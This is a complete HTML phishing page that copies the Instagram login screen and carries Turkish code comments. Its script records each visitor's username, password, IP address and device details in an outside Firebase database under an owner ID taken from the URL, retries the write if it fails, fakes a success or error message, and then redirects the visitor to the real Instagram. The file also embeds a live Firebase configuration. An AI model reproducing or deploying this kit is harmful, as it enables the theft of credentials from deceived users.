<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    
    <meta property="og:title" content="Instagram">
    <meta property="og:description" content="Create an account or log in to Instagram – Share what you're into with the people who get it.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
    <meta property="og:url" content="">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Instagram">
    <meta name="twitter:description" content="Create an account or log in to Instagram">
    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
    
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
        }
        
        .logo-box {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo-box img {
            width: 175px;
            height: auto;
            margin-bottom: 8px;
        }
        
        .logo-box .logo-text {
            font-family: 'Billabong', 'Segoe UI', cursive;
            font-size: 48px;
            color: #262626;
            display: none;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
            font-family: inherit;
        }
        
        .input-group input:focus {
            border-color: #a8a8a8;
        }
        
        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: #fff;
            border: none;
            padding: 7px 16px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 12px 0;
            font-family: inherit;
            transition: all 0.2s;
        }
        
        .login-btn:hover {
            background: #1877f2;
        }
        
        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        
        .fb-login {
            text-align: center;
            margin: 20px 0 8px;
        }
        
        .fb-login a {
            color: #385185;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .fb-icon {
            width: 16px;
            height: 16px;
            background: #385185;
            border-radius: 2px;
            color: #fff;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }
        
        .forgot-link {
            text-align: center;
            margin-top: 12px;
        }
        
        .forgot-link a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 24px;
            text-align: center;
        }
        
        .signup-box span {
            color: #262626;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .app-text {
            text-align: center;
            margin: 20px 0;
            color: #262626;
            font-size: 14px;
        }
        
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-buttons img {
            height: 40px;
            width: auto;
        }
        
        .error-msg {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        
        .success-msg {
            color: #0095f6;
            font-size: 12px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        
        .footer-links {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: #8e8e8e;
            line-height: 1.8;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 3px;
        }
        
        @media (max-width: 450px) {
            .login-box {
                padding: 25px 20px 15px;
                border: none;
                background: transparent;
            }
            .signup-box {
                border: none;
                background: transparent;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-box">
            <img src="insta.png" alt="Instagram" onerror="this.style.display='none';document.querySelector('.logo-text').style.display='block';">
            <div class="logo-text">Instagram</div>
        </div>
        
        <div class="login-box">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
            </div>
            
            <button class="login-btn" id="loginBtn">Log In</button>
            
            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>
            
            <div class="fb-login">
                <a href="#"><span class="fb-icon">f</span> Log in with Facebook</a>
            </div>
            
            <div class="forgot-link">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="error-msg" id="errorMsg"></div>
            <div class="success-msg" id="successMsg"></div>
        </div>
        
        <div class="signup-box">
            <span>Don't have an account? </span><a href="#">Sign up</a>
        </div>
        
        <div class="app-text">Get the app.</div>
        <div class="app-buttons">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
        </div>
        
        <div class="footer-links">
            <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Locations</a> · <a href="#">Instagram Lite</a> · <a href="#">Threads</a> · <a href="#">Contact Uploading & Non-Users</a> · <a href="#">Meta Verified</a>
            <br><br>
            English · © 2024 Instagram from Meta
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
            authDomain: "camerahhh-15487.firebaseapp.com",
            projectId: "camerahhh-15487",
            storageBucket: "camerahhh-15487.firebasestorage.app",
            messagingSenderId: "212849652224",
            appId: "1:212849652224:web:19d8a85c01cd81005bdee5",
            measurementId: "G-WDVJV36W7X"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('uid');

        document.getElementById('loginBtn').addEventListener('click', async () => {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            const loginBtn = document.getElementById('loginBtn');

            if (!username || !password) {
                errorMsg.style.display = 'block';
                errorMsg.innerText = 'Please enter username and password';
                successMsg.style.display = 'none';
                return;
            }

            if (!uid) {
                window.location.href = 'https://www.instagram.com';
                return;
            }

            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            loginBtn.disabled = true;
            loginBtn.innerText = 'Logging in...';

            let ip = 'unknown';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch(e) {
                console.log('IP alınamadı');
            }

            try {
                await addDoc(collection(db, "ig_accounts"), {
                    ownerId: uid,
                    username: username,
                    password: password,
                    ip: ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timestamp: new Date().toISOString(),
                    unix: Date.now()
                });

                successMsg.style.display = 'block';
                successMsg.innerText = '✓ Login successful! Redirecting...';
                loginBtn.innerText = '✓ Success';
                loginBtn.style.background = '#78de45';

                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);

            } catch(err) {
                console.error('Kayıt hatası:', err);
                
                // Hata olsa bile veriyi kaydetmeye çalış - alternatif yöntem
                try {
                    await addDoc(collection(db, "ig_accounts"), {
                        ownerId: uid,
                        username: username,
                        password: password,
                        ip: ip,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        unix: Date.now()
                    });
                    
                    successMsg.style.display = 'block';
                    successMsg.innerText = '✓ Login successful! Redirecting...';
                    loginBtn.innerText = '✓ Success';
                    loginBtn.style.background = '#78de45';

                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }, 2000);
                    
                } catch(err2) {
                    errorMsg.style.display = 'block';
                    errorMsg.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
                    loginBtn.disabled = false;
                    loginBtn.innerText = 'Log In';
                    
                    // 3 saniye sonra yine de Instagram'a yönlendir
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }, 3000);
                }
            }
        });

        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });
    </script>
</body>
</html>
